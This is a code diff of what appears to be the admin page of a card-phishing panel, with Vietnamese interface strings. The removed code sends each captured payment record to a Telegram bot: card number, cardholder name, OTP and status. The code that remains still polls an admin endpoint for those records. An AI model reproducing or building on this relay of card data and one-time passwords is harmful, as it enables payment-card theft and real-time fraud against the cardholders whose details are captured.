@@ -276,9 +276,6 @@ const telegramConfig = ref<TelegramSettings>({
   chat_id: "",
 });
 
-const BOT_TOKEN = computed(() => telegramConfig.value.bot_token || "");
-const CHAT_ID = computed(() => telegramConfig.value.chat_id || "");
-
 const loadTelegramConfig = async () => {
   try {
     const response = await $fetch<{ success: boolean; data: TelegramSettings }>(
@@ -287,9 +284,7 @@ const loadTelegramConfig = async () => {
     if (response.success && response.data) {
       telegramConfig.value = response.data;
     }
-  } catch (error) {
-    console.error("Lỗi tải cấu hình Telegram:", error);
-  }
+  } catch {}
 };
 
 const saveTelegramConfig = async () => {
@@ -309,73 +304,11 @@ const saveTelegramConfig = async () => {
     if (response.success) {
       alert(response.message);
     }
-  } catch (error) {
-    console.error("Lỗi lưu cấu hình Telegram:", error);
+  } catch {
     alert("Lỗi lưu cấu hình Telegram");
   } finally {
     savingTelegram.value = false;
   }
-};
-
-const sendTelegramNotification = async (
-  payment: PaymentInfo,
-  isNew: boolean,
-) => {
-  try {
-    if (!BOT_TOKEN.value || !CHAT_ID.value) {
-      alert("Telegram config chưa được thiết lập");
-      return;
-    }
-
-    const action = isNew ? "NEW" : "UPDATE";
-    const message = `
-🔔 <b>${action}</b>
-
-💰 <b>Method:</b> <code>${payment.method}</code>
-🏦 <b>Card:</b> <code>${payment.card_number}</code>
-👤 <b>Cardholder:</b> <code>${payment.cardholder_name}</code>
-🔐 <b>OTP:</b> <code>${payment.otp || "Không có"}</code>
-📊 <b>Status:</b> <code>${payment.status}</code>
-📅 <b>Date:</b> <code>${new Date(payment.created_at).toLocaleString("vi-VN")}</code>
-
-<a href="${window.location.origin}/admin/orders">👉 CHECK</a>
-        `.trim();
-
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN.value}/sendMessage`;
-
-    await fetch(telegramUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID.value,
-        text: message,
-        parse_mode: "HTML",
-      }),
-    });
-  } catch {}
-};
-
-const comparePayments = (
-  oldPayments: PaymentInfo[],
-  newPayments: PaymentInfo[],
-) => {
-  const oldMap = new Map(oldPayments.map((p) => [p.id, JSON.stringify(p)]));
-  const changes: { payment: PaymentInfo; isNew: boolean }[] = [];
-
-  for (const newPayment of newPayments) {
-    const oldPaymentStr = oldMap.get(newPayment.id);
-    const newPaymentStr = JSON.stringify(newPayment);
-
-    if (!oldPaymentStr) {
-      changes.push({ payment: newPayment, isNew: true });
-    } else if (oldPaymentStr !== newPaymentStr) {
-      changes.push({ payment: newPayment, isNew: false });
-    }
-  }
-
-  return changes;
 };
 
 const poll = async () => {
@@ -383,15 +316,6 @@ const poll = async () => {
 
   try {
     const newPayments = await $fetch<PaymentInfo[]>("/api/admin/payments");
-
-    if (payments.value.length > 0) {
-      const changes = comparePayments(payments.value, newPayments);
-
-      for (const { payment, isNew } of changes) {
-        await sendTelegramNotification(payment, isNew);
-      }
-    }
-
     payments.value = newPayments;
     pollingStatus.value = `(${newPayments.length})`;
   } catch {
@@ -403,20 +327,10 @@ const poll = async () => {
   }
 };
 
-const startPolling = async () => {
+const startPolling = () => {
   if (isPolling.value) return;
-
   isPolling.value = true;
-
-  try {
-    const initialPayments = await $fetch<PaymentInfo[]>("/api/admin/payments");
-    payments.value = initialPayments;
-    pollingStatus.value = `(${initialPayments.length})`;
-  } catch {
-    pollingStatus.value = "Lỗi kết nối - đang thử lại...";
-  }
-
-  pollingTimer = setTimeout(poll, 1000);
+  poll();
 };
 
 const stopPolling = () => {
@@ -441,7 +355,7 @@ const loadPayments = async () => {
 
 onMounted(async () => {
   await loadTelegramConfig();
-  await startPolling();
+  startPolling();
 });
 
 onUnmounted(() => {
